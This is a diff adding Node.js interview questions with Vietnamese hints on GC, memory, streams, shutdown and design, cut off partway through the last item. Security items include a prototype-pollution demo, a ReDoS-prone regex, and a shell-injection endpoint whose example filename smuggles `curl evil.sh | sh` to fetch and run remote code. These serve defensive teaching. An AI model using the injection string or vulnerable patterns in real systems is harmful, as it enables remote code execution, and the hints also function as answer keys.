+  - id: nodejs-024
+    level: medium
+    type: concept
+    q: How does V8 garbage collection work at a high level, and what does `--max-old-space-size` control?
+    hint: |-
+      - Generational: **young generation** (new space, Scavenge — nhanh, thường xuyên, copy object còn sống) và **old generation** (Mark-Sweep-Compact, incremental/concurrent để giảm pause).
+      - Object sống qua vài lần scavenge được promote lên old space.
+      - `--max-old-space-size=<MiB>`: giới hạn old space; vượt → "JavaScript heap out of memory" crash.
+      - Trong container: set explicit (vd ~70–75% memory limit) để còn chỗ cho Buffer/native/stack; không để V8 tự đoán sai rồi bị **OOMKilled** bởi kernel trước khi GC kịp làm việc (verify hành vi mặc định theo version).
+      - Tăng heap **không sửa leak** — chỉ trì hoãn crash.
+    followUp: What does it look like in metrics when GC pressure, rather than a leak, is the problem?
+    verify: true
+    tags: [gc, memory, v8]
+  - id: nodejs-025
+    level: medium
+    type: concept
+    q: Interpret `process.memoryUsage()` — `rss`, `heapTotal`, `heapUsed`, `external`, `arrayBuffers`. Which one does Kubernetes kill you on?
+    hint: |-
+      - `rss`: toàn bộ memory vật lý của process (heap V8 + code + stack + Buffer + native lib) — gần với con số cgroup/K8s tính → OOMKilled theo cái này (chính xác hơn là working set của container).
+      - `heapTotal`/`heapUsed`: V8 heap đã cấp / đang dùng.
+      - `external`: memory C++ gắn với object JS (Buffer...); `arrayBuffers`: phần ArrayBuffer/Buffer trong đó.
+      - Đọc pattern: heap tăng dần không giảm sau GC → leak JS; rss tăng mà heap phẳng → Buffer/native leak, fragmentation, hoặc thread stack.
+    followUp: Which of these would you export as metrics, and with what alert thresholds?
+    tags: [memory, observability]
+  - id: nodejs-026
+    level: medium
+    type: concept
+    q: How do you measure event loop health in production? Explain event loop delay vs event loop utilization.
+    hint: |-
+      - **Event loop delay** (`perf_hooks.monitorEventLoopDelay()`): histogram độ trễ giữa lúc timer "nên" chạy và lúc thật sự chạy → p99 cao = có callback dài block loop.
+      - **Event loop utilization** (`performance.eventLoopUtilization()`): tỉ lệ thời gian loop bận vs idle → gần 1 = CPU-saturated, nên scale/offload.
+      - ELU là tín hiệu autoscale tốt hơn CPU% cho Node (CPU% gồm cả GC/thread pool).
+      - Export qua Prometheus/OTel (`prom-client` có sẵn default metrics).
+    example: |-
+      ```ts
+      import { monitorEventLoopDelay, performance } from "node:perf_hooks";
+      const h = monitorEventLoopDelay({ resolution: 20 }); h.enable();
+      let last = performance.eventLoopUtilization();
+      setInterval(() => {
+        const now = performance.eventLoopUtilization(last); last = performance.eventLoopUtilization();
+        metrics.gauge("elu", now.utilization);
+        metrics.gauge("loop_delay_p99_ms", h.percentile(99) / 1e6); h.reset();
+      }, 10_000).unref();
+      ```
+    followUp: ELU is 0.3 but p99 loop delay is 800 ms. What kind of workload produces that?
+    tags: [observability, event-loop]
+  - id: nodejs-027
+    level: medium
+    type: gotcha
+    q: Why can recursive `process.nextTick` (or a never-ending chain of resolved promises) starve I/O, while recursive `setImmediate` does not?
+    hint: |-
+      - nextTick queue và microtask queue được drain **hết** trước khi loop đi tiếp; nếu callback cứ thêm việc mới vào chính queue đó → loop không bao giờ tới poll phase → không nhận I/O, timer không chạy.
+      - `setImmediate` mới thêm trong check phase được chạy ở **vòng sau** → I/O vẫn có cơ hội.
+      - Pattern chia nhỏ việc CPU: xử lý batch → `await setImmediate()` (từ `node:timers/promises`) → batch tiếp.
+    example: |-
+      ```ts
+      import { setImmediate as yieldToLoop } from "node:timers/promises";
+      for (let i = 0; i < rows.length; i += 1000) {
+        processBatch(rows.slice(i, i + 1000));
+        await yieldToLoop(); // let I/O and timers run
+      }
+      ```
+    followUp: Does `await Promise.resolve()` between batches achieve the same thing? Why not?
+    tags: [event-loop, starvation]
+  - id: nodejs-028
+    level: medium
+    type: concept
+    q: Explain Readable stream modes (paused vs flowing) and why async iteration is now the preferred way to consume them.
+    hint: |-
+      - **Paused**: đọc bằng `read()`/`'readable'`. **Flowing**: dữ liệu đẩy qua `'data'` ngay khi có (bật bằng `on('data')`, `pipe`, `resume`).
+      - Gắn `'data'` mà không xử lý backpressure → flowing không dừng → nếu handler async ghi DB chậm, dữ liệu dồn lại.
+      - `for await (const chunk of readable)`: pull-based, tự backpressure (chỉ đọc chunk tiếp khi body vòng lặp xong), lỗi thành exception, `break` sẽ destroy stream.
+      - Trộn nhiều cách consume cùng lúc → hành vi khó đoán.
+    followUp: What happens to the underlying file descriptor if you `break` out of a `for await` loop early?
+    tags: [streams]
+  - id: nodejs-029
+    level: medium
+    type: design
+    q: Build a Transform stream that parses CSV lines into objects and batches them for a bulk DB insert. What are the tricky parts?
+    hint: |-
+      - Chunk không trùng ranh giới dòng → giữ phần dư (`tail`) giữa các chunk; xử lý ở `flush()` cho dòng cuối.
+      - Quoted field chứa dấu phẩy/xuống dòng, BOM, encoding → dùng parser có sẵn (`csv-parse`) thay vì `split(",")`.
+      - `objectMode: true` ở phía output (readableObjectMode); batch N row rồi mới push hoặc ghi ở Writable với `writev`/batch.
+      - Backpressure: Writable async (insert DB) chỉ gọi callback khi insert xong → pipeline tự chậm lại.
+      - Lỗi dòng: skip + ghi lỗi (dòng số mấy) hay fail cả file — quyết định nghiệp vụ.
+    example: |-
+      ```ts
+      await pipeline(
+        fs.createReadStream(path),
+        parse({ columns: true, bom: true }),       // csv-parse: Transform in objectMode
+        async function* (rows) {
+          let batch: Row[] = [];
+          for await (const r of rows) {
+            batch.push(validate(r));
+            if (batch.length === 1000) { yield batch; batch = []; }
+          }
+          if (batch.length) yield batch;
+        },
+        new Writable({ objectMode: true, async write(batch, _e, cb) {
+          try { await repo.bulkInsert(batch); cb(); } catch (e) { cb(e as Error); }
+        } }),
+      );
+      ```
+    followUp: How would you make this import resumable after a crash at row 700,000?
+    tags: [streams, csv, design]
+  - id: nodejs-030
+    level: medium
+    type: gotcha
+    q: How does the CommonJS module cache work, and what happens with circular `require`s?
+    hint: |-
+      - `require` resolve đường dẫn → nếu đã có trong `require.cache` trả về **cùng `module.exports`** → module là singleton theo **đường dẫn resolve** (hai bản copy package ở hai thư mục = hai singleton).
+      - Circular: A require B, B require A trong lúc A chưa chạy xong → B nhận **exports chưa hoàn chỉnh** của A (object rỗng/một phần) → `undefined is not a function`.
+      - ESM xử lý circular bằng live binding nhưng vẫn có TDZ error nếu truy cập trước khi khởi tạo.
+      - Fix: tách phần chung ra module thứ ba, lazy require trong function, dependency injection.
+    followUp: Why do test runners that reset the module registry sometimes create two instances of a DB client?
+    tags: [modules, cjs]
+  - id: nodejs-031
+    level: medium
+    type: concept
+    q: What is prototype pollution in Node, how does it happen through request bodies, and how do you prevent it?
+    hint: |-
+      - Kẻ tấn công gửi key `__proto__` / `constructor.prototype` → hàm deep merge/set-by-path gán vào `Object.prototype` → **mọi object** trong process bị ảnh hưởng (vd `isAdmin: true`, đổi option của lib → có thể DoS hoặc RCE qua gadget).
+      - Nguồn: `merge(target, req.body)` tự viết/lib cũ, `set(obj, userPath, value)`, query string parser nested.
+      - Phòng: validate schema strict (whitelist key), không deep-merge input thô, dùng `Object.create(null)`/`Map` cho dictionary, `Object.hasOwn`, cập nhật lib; có flag `--disable-proto=delete`/`throw` để vô hiệu `__proto__` accessor (verify).
+      - `JSON.parse` tạo own property tên `"__proto__"` — nguy hiểm khi đem object đó đi merge.
+    example: |-
+      ```ts
+      function merge(t: any, s: any) {
+        for (const k in s) {
+          if (typeof s[k] === "object") merge((t[k] ??= {}), s[k]);
+          else t[k] = s[k];
+        }
+      }
+      merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
+      ({} as any).isAdmin; // true — every object is now "admin"
+      ```
+    followUp: Why is `Object.freeze(Object.prototype)` at startup not always a safe mitigation?
+    verify: true
+    tags: [security, prototype-pollution]
+  - id: nodejs-032
+    level: medium
+    type: concept
+    q: What is ReDoS? Show a vulnerable regex and explain why it takes down a whole Node server.
+    hint: |-
+      - Regex có **nested quantifier**/alternation chồng lấn (`(a+)+$`, `(\w+\s?)*$`) → backtracking theo cấp số nhân với input "gần khớp".
+      - Regex chạy **đồng bộ** trên main thread → một request độc hại block event loop vài giây/phút → mọi request khác timeout.
+      - Phòng: giới hạn độ dài input trước khi match, tránh nested quantifier, dùng lib validate đã kiểm chứng, lint (`eslint-plugin-regexp`, `safe-regex`), engine không backtracking (RE2 qua `re2` package) cho regex do user cung cấp.
+      - Nguồn hay gặp: validate email/URL tự viết, route pattern, parse user-agent.
+    example: |-
+      ```ts
+      const EMAIL = /^([a-zA-Z0-9]+)*@example\.com$/;
+      EMAIL.test("a".repeat(35) + "!"); // exponential backtracking, blocks the loop
+      ```
+    followUp: How would you find ReDoS-prone regexes across a large codebase and its dependencies?
+    tags: [security, redos, event-loop]
+  - id: nodejs-033
+    level: medium
+    type: debug
+    q: This endpoint converts an uploaded file with a CLI tool. What is the vulnerability and how do you fix it?
+    example: |-
+      ```ts
+      import { exec } from "node:child_process";
+      app.post("/convert", (req, res) => {
+        const name = req.body.filename; // e.g. "report.docx"
+        exec(`libreoffice --headless --convert-to pdf /uploads/${name}`, (err, out) => {
+          if (err) return res.status(500).end();
+          res.json({ ok: true });
+        });
+      });
+      ```
+    hint: |-
+      - `exec` chạy qua **shell** → `filename = "x.docx; curl evil.sh | sh"` → **command injection** (RCE).
+      - Fix: `execFile`/`spawn` với **mảng argument** (không shell), validate filename (whitelist ký tự, không `..`), dùng id server-side thay vì tên user gửi, `path.resolve` + check nằm trong thư mục cho phép.
+      - Thêm: timeout, giới hạn concurrency (CLI tốn CPU/RAM), chạy trong container/user ít quyền.
+      - `exec` còn buffer toàn bộ stdout (`maxBuffer`) — output lớn gây lỗi.
+    followUp: 'Is `spawn(cmd, args, { shell: true })` safe if you pass args as an array?'
+    tags: [security, child-process, debug]
+  - id: nodejs-034
+    level: medium
+    type: concept
+    q: How do you reduce npm supply-chain risk for a Node service?
+    hint: |-
+      - Lockfile + `npm ci`; review diff lockfile trong PR; pin base image.
+      - Chặn install script khi có thể (`--ignore-scripts`, allowlist) — nhiều malware chạy ở `postinstall`.
+      - Scan: `npm audit`/Dependabot/Snyk/OSV; ưu tiên theo **reachability**, không patch mù.
+      - Giảm dependency: dùng built-in (`fetch`, `node:test`, `crypto.randomUUID`, `--env-file`) thay vì package nhỏ.
+      - Provenance/signature (`npm audit signatures`), private registry proxy, cooldown trước khi nhận version mới (verify tính năng theo npm version).
+      - Runtime: least privilege, Node permission model (`--permission`) để giới hạn fs/child_process (verify mức ổn định).
+    followUp: A popular package you depend on was compromised yesterday. What's your incident checklist?
+    verify: true
+    tags: [security, supply-chain, npm]
+  - id: nodejs-035
+    level: hard
+    type: debug
+    q: Memory grows steadily and logs show `MaxListenersExceededWarning`. Find the leak.
+    example: |-
+      ```ts
+      import { EventEmitter } from "node:events";
+      export const priceBus = new EventEmitter(); // module-level singleton
+
+      app.get("/prices/stream", (req, res) => {
+        res.setHeader("Content-Type", "text/event-stream");
+        priceBus.on("price", (p) => res.write(`data: ${JSON.stringify(p)}\n\n`));
+      });
+      ```
+    hint: |-
+      - Mỗi SSE client thêm một listener vào emitter **sống suốt đời process**; client ngắt kết nối nhưng listener (và closure giữ `res`, socket, buffer) vẫn còn → leak + `res.write` vào socket đã đóng.
+      - Fix: lưu handler vào biến, `req.on("close", () => priceBus.off("price", handler))`; hoặc dùng `events.on(emitter, "price", { signal })` với AbortSignal huỷ khi close.
+      - Thêm: backpressure cho client chậm (`res.write` trả false → drop/đóng client), giới hạn số connection.
+      - Chứng minh: heap snapshot comparison → nhiều `ServerResponse`/closure được giữ bởi `EventEmitter._events.price`.
+    followUp: With 5,000 SSE clients, one slow client stops reading. What happens to your memory, and how do you protect the process?
+    redFlags:
+      - "Call setMaxListeners(0) to remove the warning"
+    tags: [memory-leak, events, debug]
+  - id: nodejs-036
+    level: hard
+    type: debug
+    q: A CSV import endpoint works in staging but the pod gets OOMKilled on a 2 GB file in production. Review the code.
+    example: |-
+      ```ts
+      app.post("/import", upload.single("file"), async (req, res) => {
+        const text = await fs.promises.readFile(req.file!.path, "utf8");
+        const rows = text.split("\n").map((l) => l.split(","));
+        await Promise.all(rows.map((r) => db.insert("products", toProduct(r))));
+        res.json({ imported: rows.length });
+      });
+      ```
+    hint: |-
+      - `readFile` load **toàn bộ file** vào memory (và string UTF-16 trong V8 có thể lớn hơn file); `split` tạo thêm mảng cùng cỡ → nhiều lần kích thước file. String cũng có giới hạn độ dài tối đa của V8.
+      - `Promise.all` trên hàng triệu insert → hàng triệu promise + query đồng thời → cạn connection pool, DB quá tải.
+      - Event loop bị block khi `split`/`map` trên dữ liệu khổng lồ.
+      - Fix: `pipeline(createReadStream, csvParser, batch 1000, Writable bulk insert)`; concurrency có giới hạn; chạy như **background job** (trả 202 + job id) thay vì giữ HTTP request; `split(",")` sai với quoted field.
+    followUp: The import must be all-or-nothing. How do you combine streaming with transactional semantics?
+    tags: [streams, memory, debug]
+  - id: nodejs-037
+    level: hard
+    type: debug
+    q: This export job writes 5 million rows to a file. Memory spikes to several GB even though it "uses streams". Why?
+    example: |-
+      ```ts
+      const out = fs.createWriteStream("/tmp/export.csv");
+      const cursor = db.query("SELECT * FROM orders").stream();
+      cursor.on("data", (row) => {
+        out.write(toCsvLine(row)); // return value ignored
+      });
+      cursor.on("end", () => out.end());
+      ```
+    hint: |-
+      - DB cursor ở **flowing mode** đẩy row nhanh hơn disk ghi; `out.write()` trả `false` nhưng bị bỏ qua → chunk dồn trong buffer của writable → RAM phình.
+      - Không có error handling: lỗi DB/disk → stream treo, fd leak.
+      - Fix: `await pipeline(cursor, new Transform({ objectMode: true, transform(row, _e, cb) { cb(null, toCsvLine(row)); } }), out)` — backpressure tự động truyền ngược về cursor (và cursor ngừng fetch từ DB).
+      - Hoặc `for await (const row of cursor) { if (!out.write(line)) await once(out, "drain"); }`.
+    followUp: Does backpressure propagate all the way to PostgreSQL / SQL Server? What does the driver need to support?
+    tags: [streams, backpressure, debug]
+  - id: nodejs-038
+    level: hard
+    type: debug
+    q: After adding password hashing on login, unrelated endpoints that read files or call other services get slow under load. Explain.
+    example: |-
+      ```ts
+      // login
+      const hash = await new Promise<Buffer>((ok, ko) =>
+        crypto.pbkdf2(password, salt, 600_000, 64, "sha512", (e, k) => (e ? ko(e) : ok(k))));
+      // other endpoints
+      const tpl = await fs.promises.readFile("templates/invoice.html", "utf8");
+      const r = await fetch("https://inventory.internal/stock"); // dns.lookup under the hood
+      ```
+    hint: |-
+      - `pbkdf2` async chạy trên **libuv thread pool** (4 thread mặc định). Login dồn dập → cả 4 thread bận hash hàng trăm ms → `fs.readFile` và `dns.lookup` (resolve hostname cho outbound HTTP) **xếp hàng** sau đó.
+      - Chẩn đoán: latency tăng ở endpoint chỉ dùng fs/DNS, CPU cao nhưng event loop delay thấp.
+      - Fix: tăng `UV_THREADPOOL_SIZE` (phù hợp số core), chuyển hash sang worker pool riêng/service auth riêng, cache DNS hoặc dùng IP/keep-alive (ít lookup), rate limit login.
+      - Lưu ý: `bcrypt` native cũng dùng thread pool; `bcryptjs` thì chạy trên main thread.
+    followUp: Why doesn't the Node HTTP server itself (accepting connections) slow down in this scenario?
+    tags: [thread-pool, crypto, debug]
+  - id: nodejs-039
+    level: hard
+    type: scenario
+    q: In production, p99 latency spikes to 2 seconds every few minutes while average CPU looks fine. How do you find the cause?
+    hint: |-
+      - Giả thuyết: callback dài block loop (report, JSON lớn, regex), **GC pause** (old-space major GC khi heap lớn), thread pool saturation, downstream chậm, cron chạy trong cùng process.
+      - Đo: event loop delay histogram theo thời gian (khớp spike?), GC metrics (`--trace-gc`, `PerformanceObserver` entryTypes `gc`), heap size.
+      - Profiling: `--cpu-prof` hoặc inspector/Clinic.js (`clinic doctor`/`flame`) dưới tải tái tạo được; trong prod có thể bật profiling ngắn qua inspector trên 1 pod.
+      - Tương quan: trace (OTel) cho request chậm — thời gian nằm trong span nào hay "khoảng trống" giữa span (= loop bị block).
+      - Fix theo nguyên nhân: tách job CPU sang worker/process khác, giảm allocation, stream thay vì buffer.
+    followUp: The flame graph shows 40% time in `JSON.stringify`. What are your options?
+    tags: [performance, profiling, scenario]
+  - id: nodejs-040
+    level: hard
+    type: scenario
+    q: A Node service in Kubernetes is OOMKilled every ~2 days. Walk through how you find and prove the leak.
+    hint: |-
+      - Xác nhận là leak: `heapUsed` sau GC tăng đều (sawtooth có đáy tăng dần) vs spike theo traffic; so sánh `rss` với heap (leak ngoài heap?).
+      - Lấy bằng chứng: `--heapsnapshot-signal=SIGUSR2` hoặc `--heapsnapshot-near-heap-limit=N`, hoặc `v8.writeHeapSnapshot()` qua endpoint admin; chụp 2–3 snapshot cách nhau (sau warm-up) → **Comparison view** trong Chrome DevTools → constructor tăng nhiều nhất → **Retainers** chỉ ra ai giữ reference.
+      - Lưu ý: chụp snapshot **block main thread** và cần thêm memory (~ bằng heap) → làm trên 1 pod đã rút khỏi LB.
+      - Nguyên nhân hay gặp: cache/Map không giới hạn, listener không gỡ, closure trong timer, global array log, Socket/connection không đóng, lib có bug.
+      - Fix + chứng minh: memory phẳng sau deploy; thêm alert trên heap growth.
+    followUp: The snapshot shows thousands of `Promise` objects retained. What code patterns produce that?
+    redFlags:
+      - "Increase the memory limit and add a nightly restart"
+    tags: [memory-leak, heap-snapshot, kubernetes, scenario]
+  - id: nodejs-041
+    level: hard
+    type: design
+    q: Implement graceful shutdown for an HTTP API on Kubernetes. What must happen between SIGTERM and exit?
+    hint: |-
+      1. Bắt `SIGTERM` (và `SIGINT`), chỉ chạy shutdown **một lần**.
+      2. Đánh dấu readiness = fail; chờ vài giây vì endpoint removal khỏi Service/LB diễn ra **song song** với SIGTERM (hoặc dùng `preStop` sleep).
+      3. `server.close()` ngừng nhận connection mới; đóng **idle keep-alive** (`server.closeIdleConnections()`) — Node mới cũng tự làm khi `close()` (verify); set `Connection: close` cho response đang xử lý.
+      4. Chờ in-flight request xong, dừng consumer (Kafka commit offset), flush log/trace.
+      5. Đóng DB pool, Redis, producer. `process.exit(0)`.
+      6. Hard timeout (< `terminationGracePeriodSeconds`) → `closeAllConnections()` + exit(1).
+      Container: Node phải là process nhận signal (không bọc bởi `npm start`/shell không forward) — dùng `CMD ["node", "dist/main.js"]` hoặc `tini`.
+    example: |-
+      ```ts
+      let shuttingDown = false;
+      async function shutdown(signal: string) {
+        if (shuttingDown) return; shuttingDown = true;
+        logger.info({ signal }, "shutting down");
+        health.ready = false;
+        await sleep(5_000);                        // let the LB stop routing
+        const force = setTimeout(() => { server.closeAllConnections(); process.exit(1); }, 20_000).unref();
+        await new Promise<void>((r) => server.close(() => r()));
+        server.closeIdleConnections();
+        await Promise.allSettled([consumer.disconnect(), db.end(), redis.quit()]);
+        clearTimeout(force);
+        process.exit(0);
+      }
+      process.on("SIGTERM", shutdown).on("SIGINT", shutdown);
+      ```
+    followUp: Why does `server.close()` alone sometimes never call its callback?
+    verify: true
+    tags: [graceful-shutdown, kubernetes, http]
+  - id: nodejs-042
+    level: hard
+    type: debug
+    q: During every deploy, clients see a burst of 5xx / connection-reset errors. Here's the shutdown code. What's wrong?
+    example: |-
+      ```ts
+      process.on("SIGTERM", () => {
+        server.close();
+        db.end();
+        process.exit(0);
+      });
+      ```
+    hint: |-
+      - `server.close()` là async — chỉ ngừng nhận connection mới; `process.exit(0)` ngay sau đó **giết** mọi request đang chạy.
+      - `db.end()` không được await → request đang query bị lỗi "pool is closed" trước khi exit.
+      - Không chờ LB gỡ pod → request mới vẫn tới trong vài giây đầu → connection refused.
+      - Không xử lý keep-alive connection idle, không có hard timeout, không idempotent (SIGTERM hai lần).
+      - Fix: xem pattern graceful shutdown — readiness fail → delay → close → await drain → close resources → exit.
+    followUp: How do you test graceful shutdown in CI rather than discovering it in production?
+    tags: [graceful-shutdown, debug]
+  - id: nodejs-043
+    level: hard
+    type: scenario
+    q: The service restarts a few times a day with `Unhandled promise rejection` in logs, always from a "fire-and-forget" audit log call. Diagnose and fix without losing audit events.
+    hint: |-
+      - Code kiểu `audit.write(evt)` không `await`, không `.catch` → audit service timeout → rejection không có handler → Node ≥ 15 crash cả process (mọi request đang chạy chết theo).
+      - Fix ngắn hạn: `void audit.write(evt).catch(logAndCount)`; lint `no-floating-promises`.
+      - Không mất event: ghi vào **outbox** (DB transaction cùng dữ liệu nghiệp vụ) hoặc queue bền (Kafka) rồi consumer gửi đi với retry; hoặc buffer có giới hạn + retry + DLQ.
+      - Quan sát: metric số rejection, alert; không đổi `--unhandled-rejections=warn` để "giấu" lỗi.
+    followUp: Why is `--unhandled-rejections=warn` the wrong fix, even temporarily?
+    tags: [error-handling, promises, scenario]
+  - id: nodejs-044
+    level: hard
+    type: concept
+    q: You moved image resizing to `worker_threads` but throughput got worse. What are the likely reasons?
+    hint: |-
+      - Tạo **worker mới mỗi request** → chi phí khởi tạo isolate + load module; dùng **pool** cố định (piscina) cỡ ~số core.
+      - Truyền dữ liệu bằng structured clone (copy Buffer lớn) → dùng `transferList` để chuyển ownership `ArrayBuffer`, hoặc truyền path/URL thay vì bytes.
+      - Pool lớn hơn số core (cộng thread pool libuv, GC threads) → context switch; container giới hạn CPU (cgroup) nhỏ hơn `os.cpus().length` → dùng `os.availableParallelism()` và biết CPU limit.
+      - Thư viện (vd `sharp`) vốn đã chạy native trên thread pool → worker thêm tầng thừa.
+      - Không có queue/backpressure → task dồn trong memory.
+    followUp: How do you apply backpressure from the worker pool back to HTTP clients?
+    tags: [worker-threads, performance]
+  - id: nodejs-045
+    level: hard
+    type: compare
+    q: Should a Node API use the `cluster` module when deployed on Kubernetes? What about Socket.IO?
+    hint: |-
+      - Thường **không**: K8s đã scale bằng replica; cluster trong pod làm phức tạp health check, memory limit (N process chung một limit), signal handling, metrics (mỗi worker một registry).
+      - Pattern phổ biến: 1 process/pod, CPU request ~1 core, HPA theo CPU/ELU/RPS. Dùng cluster/PM2 khi chạy trên VM không có orchestrator.
+      - Socket.IO nhiều instance: cần **sticky session** nếu dùng HTTP long-polling fallback (handshake nhiều request phải về cùng node), và **adapter** (Redis/pub-sub) để broadcast giữa các node.
+      - In-memory state (session, rate limit counter, cache) không chia sẻ giữa process/pod → Redis.
+    followUp: How do you do a rolling deploy of a Socket.IO service without dropping all clients at once?
+    tags: [cluster, kubernetes, socket-io]
+  - id: nodejs-046
+    level: hard
+    type: debug
+    q: Why does this crash the process even though the error is thrown inside a listener that "looks handled"?
+    example: |-
+      ```ts
+      import { EventEmitter } from "node:events";
+      const orders = new EventEmitter();
+      orders.on("created", async (order) => {
+        await inventory.reserve(order); // rejects when out of stock
+      });
+      try {
+        orders.emit("created", order);
+      } catch (e) {
+        logger.error(e); // never reached
+      }
+      ```
+    hint: |-
+      - `emit` gọi listener **đồng bộ** và bỏ qua giá trị trả về → promise do async listener trả về không ai `await`; `try/catch` quanh `emit` chỉ bắt lỗi sync.
+      - Rejection không có handler → `unhandledRejection` → crash (Node ≥ 15).
+      - Fix: try/catch **bên trong** listener; hoặc `new EventEmitter({ captureRejections: true })` để rejection được chuyển thành event `'error'` (phải có listener `'error'`).
+      - Thiết kế: EventEmitter in-process không bền — event nghiệp vụ quan trọng nên qua outbox/queue.
+    followUp: 'With `captureRejections: true` and no `''error''` listener, what happens?'
+    tags: [events, promises, debug]
+  - id: nodejs-047
+    level: hard
+    type: gotcha
+    q: A download endpoint leaks file descriptors until the process hits `EMFILE`. The code uses `pipe`. Why, and how do you fix it?
+    example: |-
+      ```ts
+      app.get("/files/:id", (req, res) => {
+        const src = fs.createReadStream(pathFor(req.params.id));
+        src.pipe(createGzip()).pipe(res);
+      });
+      ```
+    hint: |-
+      - Client huỷ download giữa chừng → `res` đóng/lỗi, nhưng `pipe` **không** destroy upstream → `src` (fd) và gzip treo mãi (nếu không tự kết thúc).
+      - Lỗi ở `src` (file không tồn tại) không lan sang `res` → request treo, hoặc crash nếu không có listener `'error'`.
+      - Fix: `await pipeline(src, createGzip(), res)` trong try/catch — destroy mọi stream khi một cái lỗi/đóng; trả 404 trước khi stream nếu file không tồn tại; kiểm tra path traversal cho `id`.
+      - Kiểm chứng: `lsof -p <pid> | wc -l` tăng theo số download bị huỷ.
+    followUp: How do you set `ulimit`/file descriptor limits in a container, and why isn't raising it the fix?
+    tags: [streams, file-descriptors, gotcha]
+  - id: nodejs-048
+    level: hard
+    type: gotcha
+    q: How can DNS resolution become a hidden bottleneck or failure point for a Node service that calls many HTTP APIs?
+    hint: |-
+      - `http`/`fetch` mặc định dùng `dns.lookup` (getaddrinfo) → chạy trên **thread pool** → DNS chậm chiếm thread, chặn `fs`/crypto.
+      - Node không cache DNS mặc định; mỗi connection mới có thể lookup lại → keep-alive giúp giảm lookup.
+      - Trong K8s: `ndots:5` làm một hostname ngắn thử nhiều search domain → nhiều query; dùng FQDN có dấu chấm cuối hoặc chỉnh `dnsConfig`.
+      - IPv6/IPv4: Node có `autoSelectFamily` (Happy Eyeballs, mặc định bật từ Node 20 — verify) — trước đó lỗi kết nối tới `localhost` resolve ra `::1`.
+      - Mitigation: keep-alive, DNS cache (lib `cacheable-lookup` hoặc custom `lookup`), `dns.setDefaultResultOrder`, tăng thread pool nếu cần.
+    followUp: After a Node upgrade, the service fails to connect to `localhost:5432` but works with `127.0.0.1`. Why?
+    verify: true
+    tags: [dns, thread-pool, networking]
+  - id: nodejs-049
+    level: hard
+    type: gotcha
+    q: What are the gotchas of timers in Node — delay accuracy, very large delays, and timers that keep the process alive?
+    hint: |-
+      - Delay là **tối thiểu**, không chính xác: loop bận thì timer trễ (đo event loop delay chính bằng cách này).
+      - Delay > 2³¹−1 ms (~24.8 ngày) → bị set thành 1 ms + `TimeoutOverflowWarning` → job "chạy sau 30 ngày" chạy **ngay lập tức** lặp lại.
+      - Timer/interval active giữ process sống → script/CLI không thoát; dùng `.unref()` cho timer nền (metrics, heartbeat).
+      - `setInterval` với callback async chậm hơn interval → chồng chéo; dùng vòng lặp `await setTimeout()` từ `timers/promises`.
+      - Scheduling dài hạn → dùng scheduler bền (cron, queue delayed job), không dùng timer in-memory (mất khi restart).
+    followUp: How would you implement "send reminder email in 3 days" reliably across deploys?
+    tags: [timers, gotcha]
+  - id: nodejs-050
+    level: hard
+    type: concept
+    q: An endpoint returns a 30 MB JSON report and blocks the event loop for ~800 ms. What are your options, from quick fixes to redesign?
+    hint: |-
+      - Nhanh: pagination/filter phía server, trả ít field hơn, nén (gzip cũng tốn CPU — cân nhắc offload ở proxy).
+      - Streaming: stream JSON Lines/NDJSON hoặc JSON array theo từng phần từ DB cursor → không cần `stringify` một cục; client xử lý dần.
+      - Offload: tạo report bằng **background job** → lưu file (S3) → trả link/pre-signed URL; worker thread cho phần CPU (lưu ý chi phí copy kết quả).
+      - `JSON.stringify` không thể chia nhỏ tự động — một lần gọi = một block đồng bộ.
+      - Đo trước/sau bằng event loop delay p99 và CPU profile.
+    followUp: Why can gzip middleware make this endpoint worse under load?
+    tags: [performance, json, streams]
+  - id: nodejs-051
+    level: senior
+    type: design
+    q: Design how an API service should handle CPU-heavy work like generating PDFs or resizing images on demand.
+    hint: |-
+      Không có đáp án duy nhất — trình bày theo yêu cầu:
+      - **Sync & nhỏ** (vài chục ms, tải thấp): worker pool (piscina) trong service, giới hạn queue → 503/429 khi đầy.
+      - **Nặng/bursty**: tách thành job — API ghi job (queue: SQS/Kafka/BullMQ), worker service scale độc lập, client poll/webhook/SSE; idempotent job id.
+      - **Rất nặng/không đều**: serverless/batch, hoặc service ngôn ngữ khác.
+      - Tiêu chí: latency yêu cầu, tỉ lệ đọc lặp (cache kết quả theo hash input), chi phí, isolation (một PDF lỗi không làm chết API).
+      - Quan sát: queue depth, thời gian xử lý, retry/DLQ.
+    followUp: The PDF must be returned in the same HTTP response for a legacy client. How does that change your design?
+    tags: [design, worker-threads, queues]
+  - id: nodejs-052
+    level: senior
+    type: design
+    q: What observability would you build into every Node service from day one?
+    hint: |-
+      - **Metrics**: RED (rate, errors, duration) theo route; runtime: ELU, event loop delay p99, heap used/total, GC pause, active handles, RSS; pool DB (in-use/waiting), outbound latency.
+      - **Tracing**: OpenTelemetry auto-instrumentation (HTTP, DB, Kafka), propagate `traceparent`, context qua AsyncLocalStorage.
+      - **Logging**: structured JSON (pino — async/thread transport để không block), requestId/traceId/tenantId, không log PII/secret, sampling cho log ồn.
+      - **Diagnostics sẵn sàng**: flag heap snapshot on signal, `--heapsnapshot-near-heap-limit`, endpoint profiling có bảo vệ, `--report-on-fatalerror`.
+      - Alert theo SLO, không theo mọi metric.
+    followUp: Which three alerts would you set first for a checkout API?
+    tags: [observability, design]
+  - id: nodejs-053
+    level: senior
+    type: open
+    q: When is Node.js the wrong choice for a backend service? Defend your answer.
+    hint: |-
+      Đo độ chín chắn, không "fanboy":
+      - Sai khi: workload **CPU-bound** chủ đạo (encoding video, tính toán số lớn, ML inference nặng) — một core/JS thread, cần worker phức tạp; yêu cầu latency cực thấp ổn định (GC pause); cần tận dụng shared-memory multithreading mạnh (Go/Java/Rust tốt hơn).
+      - Đúng khi: I/O-bound API/BFF, realtime (WebSocket), share code/type với frontend TS, team full-stack JS.
+      - Yếu tố tổ chức: kỹ năng team, ecosystem, vận hành sẵn có quan trọng ngang kỹ thuật.
+      - Có thể kết hợp: Node cho API, service chuyên biệt cho phần nặng.
+    followUp: Tell me about a time you moved a piece of work out of Node, or decided not to.
+    tags: [architecture, open]
+  - id: nodejs-054
+    level: senior
+    type: design
+    q: Design a job that processes 50 million records from a database into an external system with a 1 GB memory budget and must survive restarts.
+    hint: |-
+      - Đọc bằng **keyset pagination**/cursor stream (không `OFFSET` lớn), batch cỡ cố định.
+      - Pipeline có backpressure: đọc → transform → gửi với **concurrency giới hạn** (p-limit) + rate limit theo quota của external system.
